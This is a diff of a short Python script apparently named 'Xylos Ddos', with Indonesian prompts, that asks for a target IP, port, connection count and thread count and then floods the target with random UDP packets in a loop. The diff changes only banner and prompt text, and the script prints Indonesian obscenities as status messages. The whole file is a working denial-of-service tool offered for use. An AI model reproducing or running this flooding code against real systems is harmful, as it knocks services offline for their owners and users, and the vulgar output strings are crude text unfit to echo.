@@ -2,13 +2,13 @@ import random
 import socket
 import threading
 
-print("Xylos Ddos")
+print("Xylos Team")
 
-ip = str(input("Masukkan ip"))
-port = int(input("Masukkan Port"))
-times = int(input("Masukkan Connecting"))
-thread = int(input("Masukkan Thread"))
-choice = str(input("y or n"))
+ip = str(input("masukkan ip : "))
+port = int(input("Masukkan Port : "))
+times = int(input("Masukkan Connecting : "))
+thread = int(input("Masukkan Thread : "))
+choice = str(input("Y or N : "))
 
 def run():
   data = random._urandom(1025)
@@ -18,9 +18,10 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print("KONTOL")
+      print("Mengirimkan Roket Meluncur")
     except:
       print("MEMEK")
+
       
 def run2():
   data = random._urandom(16)
